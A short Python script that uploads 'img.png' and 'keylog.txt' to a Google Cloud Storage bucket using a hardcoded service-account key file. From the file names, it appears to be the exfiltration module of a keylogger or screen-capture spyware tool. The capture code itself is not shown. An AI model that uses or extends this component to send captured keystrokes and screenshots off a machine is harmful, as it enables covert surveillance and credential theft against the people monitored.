#Applicable to Google CLoud only!

try:
    import io
    from io import BytesIO
    import pandas as pd
    from google.cloud import storage
except Exception as e:
    print("Some Modules are Missing ")


#Your credentials should be stored in json format
storage_client = storage.Client.from_service_account_json("just-site-297413-07e07949787a.json")


def UploadPhotoToCloud():

    #create a Bucket object
    bucket = storage_client.get_bucket("project-111")
    filename= "%s/%s" % ('',"img.png")
    blob= bucket.blob(filename)
    
    with open('img.png','rb') as f:
        blob.upload_from_file(f)
    print("Successfully Uploaded to Cloud ")


def UploadTextToCloud():
    bucket = storage_client.get_bucket("project-111")
    filename= "%s/%s" % ('',"keylog.txt")
    blob= bucket.blob(filename)
    
    with open('keylog.txt','rb') as f:
        blob.upload_from_file(f)
    print("Successfully Uploaded to Cloud ")
